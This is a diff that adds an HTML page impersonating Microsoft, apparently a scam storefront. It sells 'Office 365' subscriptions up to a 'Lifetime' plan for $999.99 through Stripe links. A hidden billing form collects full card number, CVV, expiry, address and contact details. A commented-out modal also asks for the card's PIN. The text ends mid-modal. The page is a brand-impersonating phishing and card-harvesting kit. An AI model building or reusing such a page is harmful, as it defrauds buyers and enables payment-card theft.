@@ -1,0 +1,1431 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="assets/css/style.css"></link>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <link rel="SHORTCUT ICON" href="favicon.ico" type="image/x-icon"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css" />
+    <title>Microsoft – AI, Cloud, Productivity, Computing, Gaming &amp; Apps</title>
+    </script>
+<!--Start of Tawk.to Script-->
+
+    <style>
+      body{
+        font-family: "Inter", sans-serif!important;
+        background-color: #f2f2f2!important;
+      }
+
+      nav ul li{
+        margin: 0 10px 0 0;
+      }
+
+      nav ul li a{
+        font-family: "Inter", sans-serif;
+        font-size: 15px;
+      }
+
+      nav ul li a:hover{
+        color: #0078d4!important;
+      }
+
+      nav p{
+        font-family: "Inter", sans-serif;
+      }
+
+      h4{
+        font-family: "Inter", sans-serif; 
+      }
+
+      p, ul, li{
+        font-family: "Inter", sans-serif;
+        font-size: 14px;
+      }
+
+      ul.sidebar{
+        margin-top: 35px!important;
+      }
+
+      ul.sidebar li{
+        list-style: none;
+        margin: 22px 0;
+      }
+
+      ul.sidebar li span{
+        font-size: 16px;
+        padding-left:10px;
+      }
+
+      .owl-carousel .owl-nav button.owl-prev,
+      .owl-carousel .owl-nav button.owl-next {
+        z-index: 1;
+        width: 40px;
+        height: 47px;
+        background-color: #ccc!important;
+        border-radius: 50%;
+        position: absolute;
+        top: 46%;
+        transform: translatey(-50%);
+      }
+
+      .owl-nav button span {
+        font-size: 30px;
+        height: 100%;
+        display: block;
+        width: 100%;
+      }
+      .owl-carousel .owl-nav button.owl-prev {
+        left: -10px;
+      }
+      .owl-carousel .owl-nav button.owl-next {
+        right: -10px;
+      }
+      .owl-carousel .owl-nav {
+        margin: 0;
+      }
+
+      .loader-wrapper {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background-color: rgba(255, 255, 255, 0.9);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          z-index: 1000;
+        }
+
+        .loader {
+          border: 6px solid #f3f3f3;
+          border-top: 6px solid #3498db;
+          border-radius: 50%;
+          width: 50px;
+          height: 50px;
+          animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+          0% {
+            transform: rotate(0deg);
+          }
+          100% {
+            transform: rotate(360deg);
+          }
+        }
+
+
+        ._failed{ border-bottom: solid 4px red !important; }
+      ._failed i{  color:red !important;  }
+
+      ._success {
+          box-shadow: 0 15px 25px #00000019;
+          padding: 45px;
+          width: 100%;
+          text-align: center;
+          margin: 40px auto;
+          border-bottom: solid 4px #28a745;
+      }
+
+      ._success i {
+          font-size: 55px;
+          color: #28a745;
+      }
+
+      ._success h2 {
+          margin-bottom: 12px;
+          font-size: 40px;
+          font-weight: 500;
+          line-height: 1.2;
+          margin-top: 10px;
+      }
+
+      ._success p {
+          margin-bottom: 0px;
+          font-size: 18px;
+          color: #495057;
+          font-weight: 500;
+      }
+
+      .payment-image{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #000;
+        border-radius: 3px;
+      }
+
+
+      :where([autocomplete=one-time-code]) {
+        --otp-digits: 6;
+        --otp-ls: 2ch;
+        --otp-gap: 1.25;
+
+        /* private consts */
+        --_otp-bgsz: calc(var(--otp-ls) + 1ch);
+        --_otp-digit: 0;
+
+        all: unset;
+        background: 
+        linear-gradient(90deg, 
+          var(--otp-bg, #BBB) calc(var(--otp-gap) * var(--otp-ls)),
+          transparent 0),
+          linear-gradient(90deg, 
+          var(--otp-bg, #EEE) calc(var(--otp-gap) * var(--otp-ls)),
+          transparent 0
+        );
+        background-position: calc(var(--_otp-digit) * var(--_otp-bgsz)) 0, 0 0;
+        background-repeat: no-repeat, repeat-x;
+        background-size: var(--_otp-bgsz) 100%;
+        caret-color: var(--otp-cc, #222);
+        caret-shape: block;
+        clip-path: inset(0% calc(var(--otp-ls) / 2) 0% 0%);
+        font-family: ui-monospace, monospace;
+        font-size: var(--otp-fz, 2.5em);
+        inline-size: calc(var(--otp-digits) * var(--_otp-bgsz));
+        letter-spacing: var(--otp-ls);
+        padding-block: var(--otp-pb, 1ch);
+        padding-inline-start: calc(((var(--otp-ls) - 1ch) / 2) * var(--otp-gap));
+      }
+
+
+              .failed-container {
+                  text-align: center;
+                  background: #fff;
+                  padding: 40px;
+                  border-radius: 12px;
+                  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+              }
+
+              .failed-icon {
+                  width: 100px;
+                  height: 100px;
+                  background: #fbe9e9;
+                  border-radius: 50%;
+                  margin: 0 auto 20px;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+              }
+
+              .failed-icon img {
+                  width: 60px;
+              }
+
+              .failed-title {
+                  color: #e74c3c;
+                  font-size: 24px;
+                  font-weight: bold;
+                  margin-bottom: 10px;
+              }
+
+              .failed-message {
+                  color: #666;
+                  font-size: 16px;
+                  margin-bottom: 20px;
+              }
+
+              .failed-footer {
+                  font-size: 14px;
+                  color: #aaa;
+                  margin-bottom: 20px;
+              }
+
+              .btn-done {
+                  background-color: #5a67d8;
+                  color: #fff;
+                  border: none;
+                  padding: 10px 20px;
+                  border-radius: 8px;
+                  transition: background-color 0.3s ease;
+              }
+
+              .btn-done:hover {
+                  background-color: #434190;
+              }
+
+              input[type="password"]::-webkit-input-placeholder {
+                   color: black; /*Change the placeholder color*/
+                   opacity: 0.1; /*Change the opacity between 0 and 1*/
+              }
+
+		.badge{
+			top:-2px;
+right:5px;
+		}
+    </style>
+  </head>
+  <body>
+    
+    <nav class="navbar navbar-expand-lg navbar-light bg-white border-bottom sticky-top">
+      <div class="container-fluid">
+        <a class="navbar-brand" href="/">
+          <img src="logo.png" alt="Logo" width="280">
+        </a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav mx-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+              <a class="nav-link" aria-current="page" href="javascript:void(0)">Products</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="javascript:void(0)">Plans and pricing</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="javascript:void(0)">Resources</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="javascript:void(0)">Support</a>
+            </li>
+          </ul>
+          <div class="">
+            <p class="small mt-3 fw-bold" id="welcome-message">Welcome <i class="ms-2 fa-regular fa-user"></i></p>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <section class="main">
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-md-2 col-sm-3 col-12 bg-white ">
+            <div class=" position-fixed vh-100 bg-white">
+              <h5 class="text-primary text-uppercase mt-4 fs-6 ms-1">Programs</h5>
+              <ul class="m-0 p-0 ms-1 sidebar">
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=11571&format=png" width="30">
+                  <span>Word</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=11566&format=png" width="30">
+                  <span>Excel</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=12416&format=png" width="30">
+                  <span>PowerPoint</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=11571&format=png" width="30">
+                  <span>Access</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=16714&format=png" width="30">
+                  <span>Outlook</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=3466&format=png" width="30">
+                  <span>OneDrive</span>
+                </li>
+                <li>
+                  <img src="https://img.icons8.com/?size=50&id=12414&format=png" width="30">
+                  <span>OneNote</span>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="col-md-9 col-sm-9 col-12 mx-auto">
+            <div class="wrapper-main">
+              <div class="pt-5 text-center">
+                <img src="plans.png" alt="Microsoft" class="w-25 rounded mb-3">
+                <!-- <p>Renew your subscription to continue enjoying premium Office apps.</p> -->
+                <h4 class="text-primary">Plans</h4>
+              </div>
+              <div class="row justify-content-center mt-5">
+                <div class="owl-carousel owl-theme">
+                    <div class="item">
+                      <div class="card border-0 p-3">
+                        <img src="plans.png" alt="Microsoft" class="w-75 mb-3">
+                        <h5 class="fs-6 fw-bold">Microsoft Office 365 1 Year</h5>
+                        <p class="text-dark fw-bold">Price: $199.99</p>
+                        <ul>
+                          <li>For one to six people</li>
+                          <li>Sign in to five devices at once</li>
+                          <li>Use on PCs, Macs, phones, and tablets</li>
+                          <li>Up to 6 TB of secure cloud storage</li>
+                          <li>Apps with premium features and offline access</li>
+                          <li>Data and device security</li>
+                          <li>Ad-free, secure email</li>
+                        </ul>
+                        <a href="https://buy.stripe.com/4gM4gBeAw6F3gWAeLIdZ602" 
+   class="btn btn-sm btn-primary proceed-btn">
+   Proceed
+</a>
+
+                      </div>
+                    </div>
+                    <div class="item">
+                      <div class="card border-0 p-3">
+                        <img src="plans.png" alt="Microsoft" class="w-75 mb-3">
+                        <h5 class="fs-6 fw-bold">Microsoft Office 365 2 Year</h5>
+                        <p class="text-dark fw-bold">Price: $299.99</p>
+                        <ul>
+                          <li>For one to six people</li>
+                          <li>Sign in to five devices at once</li>
+                          <li>Use on PCs, Macs, phones, and tablets</li>
+                          <li>Up to 6 TB of secure cloud storage</li>
+                          <li>Apps with premium features and offline access</li>
+                          <li>Data and device security</li>
+                          <li>Ad-free, secure email</li>
+                        </ul>
+                        <a href="https://buy.stripe.com/cNidRbfEAaVjbCgbzwdZ603" 
+   class="btn btn-sm btn-primary proceed-btn">
+   Proceed
+</a>
+
+                      </div>
+                    </div>
+                    <div class="item">
+                      <div class="card border-0 p-3">
+                        <img src="plans.png" alt="Microsoft" class="w-75 mb-3">
+                        <h5 class="fs-6 fw-bold">Microsoft Office 365 3 Year</h5>
+                        <p class="text-dark fw-bold">Price: $399.99</p>
+
+                        <ul>
+                          <li>For one to six people</li>
+                          <li>Sign in to five devices at once</li>
+                          <li>Use on PCs, Macs, phones, and tablets</li>
+                          <li>Up to 6 TB of secure cloud storage</li>
+                          <li>Apps with premium features and offline access</li>
+                          <li>Data and device security</li>
+                          <li>Ad-free, secure email</li>
+                        </ul>
+                        <a href="https://buy.stripe.com/3cI00l2ROe7vdKofPMdZ604" 
+   class="btn btn-sm btn-primary proceed-btn">
+   Proceed
+</a>
+                      </div>
+                    </div>
+                    <div class="item position-relative">
+                      <div class="card border-0 p-3">
+			<span class="badge bg-warning small position-absolute">Recommend</span>
+                        <img src="plans.png" alt="Microsoft" class="w-75 mb-3">
+                        <h5 class="fs-6 fw-bold">Microsoft Office 365 5 Year</h5>
+                        <p class="text-dark fw-bold">Price: $599.99</p>
+                        <ul>
+                          <li>For one to six people</li>
+                          <li>Sign in to five devices at once</li>
+                          <li>Use on PCs, Macs, phones, and tablets</li>
+                          <li>Up to 6 TB of secure cloud storage</li>
+                          <li>Apps with premium features and offline access</li>
+                          <li>Data and device security</li>
+                          <li>Ad-free, secure email</li>
+                        </ul>
+                        <a href="https://buy.stripe.com/8x26oJfEA2oN6hWcDAdZ605" 
+   class="btn btn-sm btn-primary proceed-btn">
+   Proceed
+</a>
+
+                      </div>
+                    </div>
+                    <div class="item">
+                      <div class="card border-0 p-3">
+                        <img src="plans.png" alt="Microsoft" class="w-75 mb-3">
+                        <h5 class="fs-6 fw-bold">Microsoft Office 365 Lifetime</h5>
+                        <p class="text-dark fw-bold">Price: $999.99</p>
+                        <ul>
+                          <li>For one to six people</li>
+                          <li>Sign in to five devices at once</li>
+                          <li>Use on PCs, Macs, phones, and tablets</li>
+                          <li>Up to 6 TB of secure cloud storage</li>
+                          <li>Apps with premium features and offline access</li>
+                          <li>Data and device security</li>
+                          <li>Ad-free, secure email</li>
+                        </ul>
+                        <button class="btn btn-sm btn-primary proceed-btn" name="Microsoft Office 365 Life Time - $999.99">Proceed</button>
+
+                      </div>
+                    </div>
+                </div>
+              </div>
+            </div>
+            <!-- Loader -->
+            <div class="loader-wrapper" style="display: none;">
+              <div class="loader"></div>
+            </div>
+            <div class="wrapper-two" style="display: none;">
+              <div class="pt-5 text-center">
+                <h4 class="fs-5">Microsoft365</h4>
+                <p>Renew your subscription to continue enjoying premium Office apps.</p>
+              </div>
+              <div class="card border-0 p-4">
+                <h5 class="fs-5 text-center">Billing Information</h5>
+                <form id="billing-form" class="container p-4 rounded shadow-none has-validation">
+                    <!-- Name Fields -->
+                    <div class="row mb-3 border-0 bg-light rounded p-4">
+                        <div class="col-md-4">
+                            <label for="first-name" class="form-label small" required>First Name<span class="text-danger">*</span></label>
+                            <input type="text" id="first-name" class="form-control" placeholder="Enter your first name" required>
+                        </div>
+                        <div class="col-md-4">
+                            <label for="middle-name" class="form-label small">Middle Name</label>
+                            <input type="text" id="middle-name" class="form-control" placeholder="Enter your middle name">
+                        </div>
+                        <div class="col-md-4">
+                            <label for="last-name" class="form-label small" required>Last Name<span class="text-danger">*</span></label>
+                            <input type="text" id="last-name" class="form-control" placeholder="Enter your last name">
+                        </div>
+                        <div class="col-md-6 mt-3">
+                            <label for="email" class="form-label small" required>Email Address<span class="text-danger">*</span></label>
+                            <input type="email" id="email" class="form-control" placeholder="Enter your email address" required>
+                        </div>
+                        <div class="col-md-6 mt-3">
+                            <label for="phone" class="form-label small" required>Phone Number<span class="text-danger">*</span></label>
+                            <input type="tel" id="phone" class="form-control" placeholder="Enter your phone number" maxlength="13" required>
+                        </div>
+                    </div>
+
+                    <!-- Card Information -->
+                    <div class="row mb-3 border-0 bg-light rounded p-4">
+                       <div class="col-md-4">
+                          <label for="card-name" class="form-label small" maxlength="16" required>Name (As per card)<span class="text-danger">*</span></label>
+                          <input type="text" id="card-name" class="form-control" placeholder="Enter your name as on card" required>
+                      </div>
+             <div class="col-md-4">
+                            <label for="card-number" class="form-label small" maxlength="19" required>Card Number<span class="text-danger">*</span></label>
+                            <input type="text" id="card-number" class="form-control ccFormatMonitor" placeholder="Enter your 16-digit card number" required>
+                        </div>
+                        <div class="col-md-2">
+                            <label for="cvv" class="form-label small" required>CVV<span class="text-danger" maxlength="4">*</span></label>
+                            <input type="text" id="cvv" class="form-control" placeholder="Enter CVV" maxlength="4" required>
+                        </div>
+                        <div class="col-md-2">
+                            <label for="exp-month" class="form-label small" required>Expiration Date<span class="text-danger">*</span></label>
+                            <div class="d-flex gap-2">
+                                <input type="text" class="form-control" id="inputExpDate" placeholder="MM / YY" maxlength='7'>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- City, State, Zip, and Country -->
+                    <div class="row mb-3 border-0 bg-light rounded p-4">
+                        <div class="col-md-6 mb-3">
+                            <label for="address-line-1" class="form-label small" required>Address Line 1<span class="text-danger">*</span></label>
+                            <input type="text" id="address-line-1" class="form-control" placeholder="Enter your address line 1" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label for="address-line-2" class="form-label small" required>Address Line 2<span class="text-danger">*</span></label>
+                            <input type="text" id="address-line-2" class="form-control" placeholder="Enter your address line 2 (optional)">
+                        </div>
+                        <div class="col-md-3">
+                            <label for="city" class="form-label small" required>City<span class="text-danger">*</span></label>
+                            <input type="text" id="city" class="form-control" placeholder="Enter your city" required>
+                        </div>
+                        <div class="col-md-3">
+                            <label for="state" class="form-label small" required>State<span class="text-danger">*</span></label>
+                            <input type="text" id="state" class="form-control" placeholder="Enter your state" required>
+                        </div>
+                        <div class="col-md-3">
+                            <label for="zip" class="form-label small" required>Zip/Postal Code<span class="text-danger">*</span></label>
+                            <input type="text" id="zip" class="form-control" placeholder="Enter your zip/postal code" required>
+                        </div>
+                        <div class="col-md-3">
+                            <label for="country" class="form-label small">Country<span class="text-danger">*</span></label>
+                            <select id="country" class="form-select" required>
+                                <option value="Afghanistan">Afghanistan</option>
+                                  <option value="Åland Islands">Åland Islands</option>
+                                  <option value="Albania">Albania</option>
+                                  <option value="Algeria">Algeria</option>
+                                  <option value="American Samoa">American Samoa</option>
+                                  <option value="Andorra">Andorra</option>
+                                  <option value="Angola">Angola</option>
+                                  <option value="Anguilla">Anguilla</option>
+                                  <option value="Antarctica">Antarctica</option>
+                                  <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+                                  <option value="Argentina">Argentina</option>
+                                  <option value="Armenia">Armenia</option>
+                                  <option value="Aruba">Aruba</option>
+                                  <option value="Australia">Australia</option>
+                                  <option value="Austria">Austria</option>
+                                  <option value="Azerbaijan">Azerbaijan</option>
+                                  <option value="Bahamas">Bahamas</option>
+                                  <option value="Bahrain">Bahrain</option>
+                                  <option value="Bangladesh">Bangladesh</option>
+                                  <option value="Barbados">Barbados</option>
+                                  <option value="Belarus">Belarus</option>
+                                  <option value="Belgium">Belgium</option>
+                                  <option value="Belize">Belize</option>
+                                  <option value="Benin">Benin</option>
+                                  <option value="Bermuda">Bermuda</option>
+                                  <option value="Bhutan">Bhutan</option>
+                                  <option value="Bolivia">Bolivia</option>
+                                  <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+                                  <option value="Botswana">Botswana</option>
+                                  <option value="Bouvet Island">Bouvet Island</option>
+                                  <option value="Brazil">Brazil</option>
+                                  <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
+                                  <option value="Brunei Darussalam">Brunei Darussalam</option>
+                                  <option value="Bulgaria">Bulgaria</option>
+                                  <option value="Burkina Faso">Burkina Faso</option>
+                                  <option value="Burundi">Burundi</option>
+                                  <option value="Cambodia">Cambodia</option>
+                                  <option value="Cameroon">Cameroon</option>
+                                  <option value="Canada">Canada</option>
+                                  <option value="Cape Verde">Cape Verde</option>
+                                  <option value="Cayman Islands">Cayman Islands</option>
+                                  <option value="Central African Republic">Central African Republic</option>
+                                  <option value="Chad">Chad</option>
+                                  <option value="Chile">Chile</option>
+                                  <option value="China">China</option>
+                                  <option value="Christmas Island">Christmas Island</option>
+                                  <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
+                                  <option value="Colombia">Colombia</option>
+                                  <option value="Comoros">Comoros</option>
+                                  <option value="Congo">Congo</option>
+                                  <option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option>
+                                  <option value="Cook Islands">Cook Islands</option>
+                                  <option value="Costa Rica">Costa Rica</option>
+                                  <option value="Cote D'ivoire">Cote D'ivoire</option>
+                                  <option value="Croatia">Croatia</option>
+                                  <option value="Cuba">Cuba</option>
+                                  <option value="Cyprus">Cyprus</option>
+                                  <option value="Czech Republic">Czech Republic</option>
+                                  <option value="Denmark">Denmark</option>
+                                  <option value="Djibouti">Djibouti</option>
+                                  <option value="Dominica">Dominica</option>
+                                  <option value="Dominican Republic">Dominican Republic</option>
+                                  <option value="Ecuador">Ecuador</option>
+                                  <option value="Egypt">Egypt</option>
+                                  <option value="El Salvador">El Salvador</option>
+                                  <option value="Equatorial Guinea">Equatorial Guinea</option>
+                                  <option value="Eritrea">Eritrea</option>
+                                  <option value="Estonia">Estonia</option>
+                                  <option value="Ethiopia">Ethiopia</option>
+                                  <option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option>
+                                  <option value="Faroe Islands">Faroe Islands</option>
+                                  <option value="Fiji">Fiji</option>
+                                  <option value="Finland">Finland</option>
+                                  <option value="France">France</option>
+                                  <option value="French Guiana">French Guiana</option>
+                                  <option value="French Polynesia">French Polynesia</option>
+                                  <option value="French Southern Territories">French Southern Territories</option>
+                                  <option value="Gabon">Gabon</option>
+                                  <option value="Gambia">Gambia</option>
+                                  <option value="Georgia">Georgia</option>
+                                  <option value="Germany">Germany</option>
+                                  <option value="Ghana">Ghana</option>
+                                  <option value="Gibraltar">Gibraltar</option>
+                                  <option value="Greece">Greece</option>
+                                  <option value="Greenland">Greenland</option>
+                                  <option value="Grenada">Grenada</option>
+                                  <option value="Guadeloupe">Guadeloupe</option>
+                                  <option value="Guam">Guam</option>
+                                  <option value="Guatemala">Guatemala</option>
+                                  <option value="Guernsey">Guernsey</option>
+                                  <option value="Guinea">Guinea</option>
+                                  <option value="Guinea-bissau">Guinea-bissau</option>
+                                  <option value="Guyana">Guyana</option>
+                                  <option value="Haiti">Haiti</option>
+                                  <option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option>
+                                  <option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option>
+                                  <option value="Honduras">Honduras</option>
+                                  <option value="Hong Kong">Hong Kong</option>
+                                  <option value="Hungary">Hungary</option>
+                                  <option value="Iceland">Iceland</option>
+                                  <option value="India">India</option>
+                                  <option value="Indonesia">Indonesia</option>
+                                  <option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option>
+                                  <option value="Iraq">Iraq</option>
+                                  <option value="Ireland">Ireland</option>
+                                  <option value="Isle of Man">Isle of Man</option>
+                                  <option value="Israel">Israel</option>
+                                  <option value="Italy">Italy</option>
+                                  <option value="Jamaica">Jamaica</option>
+                                  <option value="Japan">Japan</option>
+                                  <option value="Jersey">Jersey</option>
+                                  <option value="Jordan">Jordan</option>
+                                  <option value="Kazakhstan">Kazakhstan</option>
+                                  <option value="Kenya">Kenya</option>
+                                  <option value="Kiribati">Kiribati</option>
+                                  <option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option>
+                                  <option value="Korea, Republic of">Korea, Republic of</option>
+                                  <option value="Kuwait">Kuwait</option>
+                                  <option value="Kyrgyzstan">Kyrgyzstan</option>
+                                  <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
+                                  <option value="Latvia">Latvia</option>
+                                  <option value="Lebanon">Lebanon</option>
+                                  <option value="Lesotho">Lesotho</option>
+                                  <option value="Liberia">Liberia</option>
+                                  <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
+                                  <option value="Liechtenstein">Liechtenstein</option>
+                                  <option value="Lithuania">Lithuania</option>
+                                  <option value="Luxembourg">Luxembourg</option>
+                                  <option value="Macao">Macao</option>
+                                  <option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option>
+                                  <option value="Madagascar">Madagascar</option>
+                                  <option value="Malawi">Malawi</option>
+                                  <option value="Malaysia">Malaysia</option>
+                                  <option value="Maldives">Maldives</option>
+                                  <option value="Mali">Mali</option>
+                                  <option value="Malta">Malta</option>
+                                  <option value="Marshall Islands">Marshall Islands</option>
+                                  <option value="Martinique">Martinique</option>
+                                  <option value="Mauritania">Mauritania</option>
+                                  <option value="Mauritius">Mauritius</option>
+                                  <option value="Mayotte">Mayotte</option>
+                                  <option value="Mexico">Mexico</option>
+                                  <option value="Micronesia, Federated States of">Micronesia, Federated States of</option>
+                                  <option value="Moldova, Republic of">Moldova, Republic of</option>
+                                  <option value="Monaco">Monaco</option>
+                                  <option value="Mongolia">Mongolia</option>
+                                  <option value="Montenegro">Montenegro</option>
+                                  <option value="Montserrat">Montserrat</option>
+                                  <option value="Morocco">Morocco</option>
+                                  <option value="Mozambique">Mozambique</option>
+                                  <option value="Myanmar">Myanmar</option>
+                                  <option value="Namibia">Namibia</option>
+                                  <option value="Nauru">Nauru</option>
+                                  <option value="Nepal">Nepal</option>
+                                  <option value="Netherlands">Netherlands</option>
+                                  <option value="Netherlands Antilles">Netherlands Antilles</option>
+                                  <option value="New Caledonia">New Caledonia</option>
+                                  <option value="New Zealand">New Zealand</option>
+                                  <option value="Nicaragua">Nicaragua</option>
+                                  <option value="Niger">Niger</option>
+                                  <option value="Nigeria">Nigeria</option>
+                                  <option value="Niue">Niue</option>
+                                  <option value="Norfolk Island">Norfolk Island</option>
+                                  <option value="Northern Mariana Islands">Northern Mariana Islands</option>
+                                  <option value="Norway">Norway</option>
+                                  <option value="Oman">Oman</option>
+                                  <option value="Pakistan">Pakistan</option>
+                                  <option value="Palau">Palau</option>
+                                  <option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option>
+                                  <option value="Panama">Panama</option>
+                                  <option value="Papua New Guinea">Papua New Guinea</option>
+                                  <option value="Paraguay">Paraguay</option>
+                                  <option value="Peru">Peru</option>
+                                  <option value="Philippines">Philippines</option>
+                                  <option value="Pitcairn">Pitcairn</option>
+                                  <option value="Poland">Poland</option>
+                                  <option value="Portugal">Portugal</option>
+                                  <option value="Puerto Rico">Puerto Rico</option>
+                                  <option value="Qatar">Qatar</option>
+                                  <option value="Reunion">Reunion</option>
+                                  <option value="Romania">Romania</option>
+                                  <option value="Russian Federation">Russian Federation</option>
+                                  <option value="Rwanda">Rwanda</option>
+                                  <option value="Saint Helena">Saint Helena</option>
+                                  <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+                                  <option value="Saint Lucia">Saint Lucia</option>
+                                  <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
+                                  <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
+                                  <option value="Samoa">Samoa</option>
+                                  <option value="San Marino">San Marino</option>
+                                  <option value="Sao Tome and Principe">Sao Tome and Principe</option>
+                                  <option value="Saudi Arabia">Saudi Arabia</option>
+                                  <option value="Senegal">Senegal</option>
+                                  <option value="Serbia">Serbia</option>
+                                  <option value="Seychelles">Seychelles</option>
+                                  <option value="Sierra Leone">Sierra Leone</option>
+                                  <option value="Singapore">Singapore</option>
+                                  <option value="Slovakia">Slovakia</option>
+                                  <option value="Slovenia">Slovenia</option>
+                                  <option value="Solomon Islands">Solomon Islands</option>
+                                  <option value="Somalia">Somalia</option>
+                                  <option value="South Africa">South Africa</option>
+                                  <option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option>
+                                  <option value="Spain">Spain</option>
+                                  <option value="Sri Lanka">Sri Lanka</option>
+                                  <option value="Sudan">Sudan</option>
+                                  <option value="Suriname">Suriname</option>
+                                  <option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option>
+                                  <option value="Swaziland">Swaziland</option>
+                                  <option value="Sweden">Sweden</option>
+                                  <option value="Switzerland">Switzerland</option>
+                                  <option value="Syrian Arab Republic">Syrian Arab Republic</option>
+                                  <option value="Taiwan">Taiwan</option>
+                                  <option value="Tajikistan">Tajikistan</option>
+                                  <option value="Tanzania, United Republic of">Tanzania, United Republic of</option>
+                                  <option value="Thailand">Thailand</option>
+                                  <option value="Timor-leste">Timor-leste</option>
+                                  <option value="Togo">Togo</option>
+                                  <option value="Tokelau">Tokelau</option>
+                                  <option value="Tonga">Tonga</option>
+                                  <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+                                  <option value="Tunisia">Tunisia</option>
+                                  <option value="Turkey">Turkey</option>
+                                  <option value="Turkmenistan">Turkmenistan</option>
+                                  <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
+                                  <option value="Tuvalu">Tuvalu</option>
+                                  <option value="Uganda">Uganda</option>
+                                  <option value="Ukraine">Ukraine</option>
+                                  <option value="United Arab Emirates">United Arab Emirates</option>
+                                  <option value="United Kingdom">United Kingdom</option>
+                                  <option value="United States" selected>United States</option>
+                                  <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
+                                  <option value="Uruguay">Uruguay</option>
+                                  <option value="Uzbekistan">Uzbekistan</option>
+                                  <option value="Vanuatu">Vanuatu</option>
+                                  <option value="Venezuela">Venezuela</option>
+                                  <option value="Viet Nam">Viet Nam</option>
+                                  <option value="Virgin Islands, British">Virgin Islands, British</option>
+                                  <option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option>
+                                  <option value="Wallis and Futuna">Wallis and Futuna</option>
+                                  <option value="Western Sahara">Western Sahara</option>
+                                  <option value="Yemen">Yemen</option>
+                                  <option value="Zambia">Zambia</option>
+                                  <option value="Zimbabwe">Zimbabwe</option>
+                                <!-- Add more countries as needed -->
+                            </select>
+                        </div>
+                        <!-- Modal -->
+                        <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+                          <div class="modal-dialog modal-dialog-centered modal-md">
+                            <div class="modal-content">
+                              <!-- <div class="modal-header">
+                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                              </div> -->
+                              <div class="modal-body">
+                                <!-- <div class="row pe-3">
+                                  <div class="col-12">
+                                    <label for="zip" class="form-label small" required>Enter your card's 4/6 digit pin code<span class="text-danger">*</span></label>
+                                  </div>
+                                  <div class="col-md-9">                                    
+                                   <label>
+                                    <input type="text" autocomplete="one-time-code" inputmode="numeric" maxlength="6" pattern="\d{6}">
+                                   </label>
+                                  </div>
+                                  <div class="col-md-3 payment-image">
+                                    <img src="assets/images/payment-card.png" class="w-100">
+                                  </div>
+                                  <div class="col-md-6">
+                                    <button type="button" class="btn btn-primary mt-3 submit-button">Pay Now</button>
+                                  </div>
+                                  <div class="col-md-6">
+                                    <img src="assets/images/secure-payment.png" class="w-100">
